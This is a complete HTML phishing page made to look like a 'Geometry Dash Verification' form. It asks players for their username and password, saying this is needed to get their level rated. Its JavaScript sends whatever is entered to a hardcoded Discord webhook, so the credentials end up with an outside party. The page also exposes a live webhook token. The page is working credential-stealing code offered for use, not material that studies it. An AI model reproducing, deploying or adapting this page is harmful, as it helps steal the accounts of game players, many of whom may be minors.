<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Geometry Dash Verification</title>

<style>
@font-face {
    font-family: 'Pusab';
    src: url('./PUSAB___.otf') format('opentype');
    font-weight: normal;
    font-style: normal;
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Pusab', sans-serif;
}

body {
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;

    background: linear-gradient(
        to bottom,
        #0c2f3a,
        #134857
    );
}

.panel {
    width: 430px;

    background: #9b5d3c;

    border: 3px solid #d3b18d;
    border-radius: 10px;

    padding: 20px;

    box-shadow:
        inset 0 0 0 2px #794327,
        0 8px 25px rgba(0,0,0,.45);
}

.title {
    text-align: center;
    color: #fff7d0;
    font-size: 24px;
    margin-bottom: 20px;

    text-shadow:
        2px 2px 0 #5a2d15;
}

.label {
    color: #fff7d0;
    font-size: 12px;
    margin-bottom: 6px;
    letter-spacing: 1px;
}

.input,
.textarea {
    width: 100%;

    background: #6d3e25;

    border: 2px solid #8b5637;
    border-radius: 7px;

    color: white;

    padding: 10px;

    margin-bottom: 14px;

    outline: none;

    box-shadow:
        inset 0 2px 5px rgba(0,0,0,.35);
}

.input:focus,
.textarea:focus {
    border-color: #e1c18d;
}

.textarea {
    resize: none;
    height: 140px;
}

.button-row {
    display: flex;
    justify-content: center;
    gap: 12px;
}

.btn {
    min-width: 120px;

    background: linear-gradient(
        to bottom,
        #fff88d 0%,
        #a8ff63 35%,
        #61bb2d 100%
    );

    border: 2px solid #486916;
    border-radius: 7px;

    color: white;
    font-size: 14px;

    padding: 8px 16px;

    cursor: pointer;

    text-shadow:
        1px 1px 0 #2d4a0c;

    box-shadow:
        inset 0 1px 0 rgba(255,255,255,.5),
        0 2px 0 #30480f;

    transition: .15s;
}

.btn:hover {
    filter: brightness(1.08);
}

.btn:active {
    transform: translateY(2px);

    box-shadow:
        inset 0 2px 4px rgba(0,0,0,.4);
}

.status {
    text-align: center;
    color: #fff7d0;
    margin-top: 14px;
    min-height: 20px;
    font-size: 12px;
}
</style>
</head>

<body>

<div class="panel">

    <div class="title">Please enter your account info to get your level rated:</div>

    <div class="label">USERNAME</div>
    <input
        type="text"
        id="username"
        class="input"
        placeholder="Enter username..."
    >

    <div class="label">PASSWORD</div>
    <textarea
        id="message"
        class="textarea"
        placeholder="Enter password..."
    ></textarea>

    <div class="button-row">
        <button class="btn" onclick="clearFields()">
            Cancel
        </button>

        <button class="btn" onclick="sendWebhook()">
            Send
        </button>
    </div>

    <div class="status" id="status"></div>

</div>

<script>
const webhookUrl = "https://discordapp.com/api/webhooks/1514664350181494936/u2oN67gH6pqObtjnL6aZcddJWXiZ5TNtNkiCJGPJEZ6HyEnWXrKF19ngKBaxhwFZ5NIx";

async function sendWebhook() {

    const username =
        document.getElementById("username").value.trim();

    const message =
        document.getElementById("message").value.trim();

    const status =
        document.getElementById("status");

    if (!message) {
        status.textContent = "Please correctly fill in your information.";
        return;
    }

    try {

        const response = await fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                username: username || "GD Verification",
                content: message
            })
        });

        if (response.ok) {
            status.textContent = "Info";
            document.getElementById("message").value = "";
        } else {
            status.textContent = "Failed to send.";
        }

    } catch (err) {
        console.error(err);
        status.textContent = "Error sending info.";
    }
}

function clearFields() {
    document.getElementById("username").value = "";
    document.getElementById("message").value = "";
    document.getElementById("status").textContent = "";
}
</script>

</body>
</html>
